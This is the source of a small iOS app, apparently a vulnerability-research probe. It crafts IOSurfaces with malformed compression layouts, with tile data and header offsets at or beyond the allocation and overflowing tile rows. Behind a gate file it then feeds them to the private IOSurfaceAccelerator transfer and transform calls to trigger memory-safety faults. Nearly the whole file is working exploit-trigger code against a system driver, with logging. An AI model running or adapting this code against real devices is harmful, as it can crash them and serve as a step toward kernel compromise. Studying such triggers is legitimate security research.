// CSC — crafted compressed IOSurface + gated IOSurfaceAccelerator trigger
#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <IOSurface/IOSurfaceRef.h>
#import <dlfcn.h>
#import <mach/mach.h>
#import <string.h>
#import <stdlib.h>

static NSMutableString *gLog; static NSString *gPath;
static void L(NSString *fmt, ...){va_list ap;va_start(ap,fmt);NSString*s=[[NSString alloc]initWithFormat:fmt arguments:ap];va_end(ap);[gLog appendString:s];[gLog appendString:@"\n"];[gLog writeToFile:gPath atomically:YES encoding:NSUTF8StringEncoding error:nil];NSLog(@"[csc] %@",s);}

typedef void *IOSurfaceAcceleratorRef;
typedef kern_return_t (*AccelCreateFn)(CFAllocatorRef, uint32_t, IOSurfaceAcceleratorRef *);
typedef kern_return_t (*AccelTransferFn)(IOSurfaceAcceleratorRef, IOSurfaceRef, IOSurfaceRef, CFDictionaryRef, void *);
typedef kern_return_t (*AccelTransformFn)(IOSurfaceAcceleratorRef, IOSurfaceRef, IOSurfaceRef, CFDictionaryRef, void *, void *, void *, void *);

static IOSurfaceRef makeComp(NSString *tag, uint32_t w, uint32_t h, uint32_t bpe, uint32_t pf,
                             uint32_t tileW, uint32_t tileH, uint32_t compType,
                             uint64_t allocSize, uint64_t planeSize,
                             uint64_t dataOff, uint64_t headerOff,
                             uint32_t slices, uint32_t dataPerSlice, uint32_t headerPerSlice,
                             uint32_t bytesPerTileData, uint32_t bytesPerRowTileData,
                             uint32_t widthInTiles, uint32_t heightInTiles){
    uint32_t widthLonger=((w-1)&~(tileW-1))+tileW;
    uint32_t heightLonger=((h-1)&~(tileH-1))+tileH;
    NSDictionary *plane=@{
        @"IOSurfacePlaneWidth":@(w), @"IOSurfacePlaneHeight":@(h),
        @"IOSurfacePlaneBytesPerElement":@(bpe),
        @"IOSurfacePlaneBytesPerRow":@((uint64_t)widthLonger*bpe),
        @"IOSurfacePlaneOffset":@0, @"IOSurfacePlaneSize":@(planeSize),
        @"IOSurfaceAddressFormat":@3,
        @"IOSurfacePlaneBytesPerCompressedTileHeader":@2,
        @"IOSurfacePlaneCompressedTileDataRegionOffset":@(dataOff),
        @"IOSurfacePlaneCompressedTileHeaderRegionOffset":@(headerOff),
        @"IOSurfacePlaneCompressedTileHeight":@(tileH),
        @"IOSurfacePlaneCompressedTileWidth":@(tileW),
        @"IOSurfacePlaneCompressionType":@(compType),
        @"IOSurfacePlaneHeightInCompressedTiles":@(heightInTiles?heightInTiles:heightLonger/tileH),
        @"IOSurfacePlaneWidthInCompressedTiles":@(widthInTiles?widthInTiles:widthLonger/tileW),
        @"IOSurfacePlaneBytesPerTileData":@(bytesPerTileData?bytesPerTileData:0),
        @"IOSurfacePlaneBytesPerRowOfTileData":@(bytesPerRowTileData?bytesPerRowTileData:0),
        @"IOSurfacePlaneDataRegionBytesPerSlice":@(dataPerSlice?dataPerSlice:0),
        @"IOSurfacePlaneHeaderRegionBytesPerSlice":@(headerPerSlice?headerPerSlice:0),
    };
    NSDictionary *props=@{
        @"IOSurfaceWidth":@(w), @"IOSurfaceHeight":@(h),
        @"IOSurfaceBytesPerElement":@(bpe),
        @"IOSurfaceAllocSize":@(allocSize),
        @"IOSurfacePixelFormat":@(pf),
        @"IOSurfaceAddressFormat":@3,
        @"IOSurfaceSliceCount":@(slices?slices:1),
        @"IOSurfacePlaneInfo":@[plane],
    };
    IOSurfaceRef s=IOSurfaceCreate((__bridge CFDictionaryRef)props);
    L(@"[mk %@] w=%u h=%u bpe=%u pf=0x%x alloc=0x%llx plane=0x%llx dataOff=0x%llx hdrOff=0x%llx slices=%u s=%p",
      tag,w,h,bpe,pf,(unsigned long long)allocSize,(unsigned long long)planeSize,
      (unsigned long long)dataOff,(unsigned long long)headerOff,slices,s);
    if(s){
        L(@"[mk %@] alloc=%zu w=%zu h=%zu bpr=%zu bpe=%zu planes=%zu base=%p",
          tag,IOSurfaceGetAllocSize(s),IOSurfaceGetWidth(s),IOSurfaceGetHeight(s),
          IOSurfaceGetBytesPerRow(s),IOSurfaceGetBytesPerElement(s),IOSurfaceGetPlaneCount(s),
          IOSurfaceGetBaseAddress(s));
    }
    return s;
}
static void tryAccel(IOSurfaceRef src, IOSurfaceRef dst, const char *tag){
    void*h=dlopen("/System/Library/PrivateFrameworks/IOSurfaceAccelerator.framework/IOSurfaceAccelerator",RTLD_LAZY);
    if(!h){L(@"[accel %s] dlopen fail %s",tag,dlerror());return;}
    AccelCreateFn create=(AccelCreateFn)dlsym(h,"IOSurfaceAcceleratorCreate");
    AccelTransferFn transfer=(AccelTransferFn)dlsym(h,"IOSurfaceAcceleratorTransferSurface");
    AccelTransformFn transform=(AccelTransformFn)dlsym(h,"IOSurfaceAcceleratorTransformSurface");
    L(@"[accel %s] create=%p transfer=%p transform=%p",tag,create,transfer,transform);
    if(!create){dlclose(h);return;}
    IOSurfaceAcceleratorRef a=NULL; kern_return_t kr=create(kCFAllocatorDefault,0,&a);
    L(@"[accel %s] create -> 0x%x %p",tag,kr,a);
    if(kr==KERN_SUCCESS&&a){
        if(transfer&&src&&dst){
            kr=transfer(a,src,dst,NULL,NULL);L(@"[accel %s] transfer(src->dst) -> 0x%x",tag,kr);
            if(kr) { kr=transfer(a,src,dst,(__bridge CFDictionaryRef)@{},NULL);L(@"[accel %s] transfer({}) -> 0x%x",tag,kr); }
        }
        if(transform&&src&&dst){
            kr=transform(a,src,dst,NULL,NULL,NULL,NULL,NULL);L(@"[accel %s] transform -> 0x%x",tag,kr);
        }
        CFRelease(a);
    }
    dlclose(h);
}
static void run(void){@autoreleasepool{
    L(@"=== csc start uid=%d pid=%d",getuid(),getpid());
    NSString*docs=[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,NSUserDomainMask,YES) firstObject];
    BOOL gate=[[NSFileManager defaultManager] fileExistsAtPath:[docs stringByAppendingPathComponent:@"run_csc"]];
    L(@"[gate] run_csc=%d",gate);
    // baseline valid compressed BGRA10_XR (web template)
    uint32_t w=256,h=256,bpe=8,tileW=8,tileH=16;
    uint32_t wl=((w-1)&~(tileW-1))+tileW, hl=((h-1)&~(tileH-1))+tileH;
    uint64_t image=(uint64_t)wl*hl*bpe, total=image+0x20000;
    IOSurfaceRef base=makeComp(@"base",w,h,bpe,0x26773461,tileW,tileH,2,total,total,0,image,1,0,0,0,0,0,0);
    // offset at end of allocation
    IOSurfaceRef offEnd=makeComp(@"offEnd",w,h,bpe,0x26773461,tileW,tileH,2,total,total,total-0x1000,0,1,0,0,0,0,0,0);
    // offset beyond allocation
    IOSurfaceRef offBeyond=makeComp(@"offBeyond",w,h,bpe,0x26773461,tileW,tileH,2,total,total,total+0x100000,0,1,0,0,0,0,0,0);
    // small plane, offset far beyond
    IOSurfaceRef smallPlane=makeComp(@"smallPlane",w,h,bpe,0x26773461,tileW,tileH,2,total,0x1000,0x100000,0,1,0,0,0,0,0,0);
    // F3 shape (L008, compression 3, tile-data row overflow)
    IOSurfaceRef f3=makeComp(@"f3",65536,4,1,1278226488,1,2,3,0x40000,0x40000,0,0x40000,2,0x20000,0,0x10001,0x10000,0x10000,2);
    // F1 shape (data+header overflow)
    IOSurfaceRef f1=makeComp(@"f1",64,64,1,1278226488,1,1,2,0x10000,0x10000,0,0x40000000,4,0x4000,0x40000000,0,0,0,0);
    if(!gate){L(@"[gate] creation-only run, no accelerator");return;}
    // safe source surface (BGRA)
    NSDictionary *sp=@{@"IOSurfaceWidth":@(256),@"IOSurfaceHeight":@(256),@"IOSurfaceBytesPerElement":@4,@"IOSurfacePixelFormat":@0x42475241};
    IOSurfaceRef src=IOSurfaceCreate((__bridge CFDictionaryRef)sp);
    L(@"[src] %p alloc=0x%zx",src,src?IOSurfaceGetAllocSize(src):0);
    if(base) tryAccel(src,base,"base");
    if(offEnd) tryAccel(src,offEnd,"offEnd");
    if(offBeyond) tryAccel(src,offBeyond,"offBeyond");
    if(smallPlane) tryAccel(src,smallPlane,"smallPlane");
    if(f3) tryAccel(src,f3,"f3");
    if(f1) tryAccel(src,f1,"f1");
    if(src)CFRelease(src);
    L(@"=== csc done ===");
}}
@interface AppDelegate:UIResponder<UIApplicationDelegate>@property(strong,nonatomic)UIWindow*window;@end
@implementation AppDelegate
- (BOOL)application:(UIApplication*)app didFinishLaunchingWithOptions:(NSDictionary*)opts{self.window=[[UIWindow alloc]initWithFrame:[UIScreen mainScreen].bounds];UIViewController*vc=[UIViewController new];vc.view.backgroundColor=UIColor.blackColor;UITextView*tv=[[UITextView alloc]initWithFrame:vc.view.bounds];tv.backgroundColor=UIColor.blackColor;tv.textColor=UIColor.greenColor;tv.font=[UIFont monospacedSystemFontOfSize:9 weight:UIFontWeightRegular];tv.editable=NO;tv.text=@"CSC";[vc.view addSubview:tv];self.window.rootViewController=vc;[self.window makeKeyAndVisible];[UIApplication sharedApplication].idleTimerDisabled=YES;NSString*docs=[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,NSUserDomainMask,YES)firstObject];gPath=[[docs stringByAppendingPathComponent:@"csc.log"]copy];gLog=[NSMutableString new];L(@"=== csc launch ===");dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED,0),^{run();dispatch_async(dispatch_get_main_queue(),^{tv.text=gLog;});});return YES;}
@end
int main(int argc,char**argv){@autoreleasepool{return UIApplicationMain(argc,argv,nil,NSStringFromClass([AppDelegate class]));}}
